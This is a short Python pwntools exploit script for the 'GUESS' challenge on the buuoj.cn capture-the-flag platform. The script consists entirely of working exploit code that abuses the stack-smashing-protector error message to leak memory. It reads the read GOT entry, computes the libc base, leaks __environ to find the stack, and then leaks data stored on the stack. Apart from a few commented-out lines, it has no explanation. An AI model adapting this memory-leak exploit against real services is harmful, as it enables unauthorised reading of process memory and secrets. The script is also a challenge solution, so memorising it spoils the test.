from pwn import *
# from LibcSearcher import *

io = remote("node4.buuoj.cn", 27426)
# io = process("./GUESS")
libc = ELF("./libc-2.23.so")

read_got = 0x602040

payload = "a"*0x128 + p64(read_got)
io.sendline(payload)

io.recvuntil("*** stack smashing detected ***: ")
addr = u64(io.recv(7)[:-1].ljust(8, "\x00"))
print(hex(addr))

# libc = LibcSearcher("read", addr)
base = addr - libc.symbols["read"]
system = base + libc.symbols["system"]
environ = base + libc.symbols["__environ"]

payload = "b"*0x128 + p64(environ)
io.sendlineafter("Please type your guessing flag\n", payload)
env = u64(io.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
print(hex(env))

payload = "c"*0x128 + p64(env-0x168)
io.sendlineafter("Please type your guessing flag\n",payload)
io.recvuntil("*** stack smashing detected ***: ")


# gdb.attach(io)
# raw_input()

io.interactive()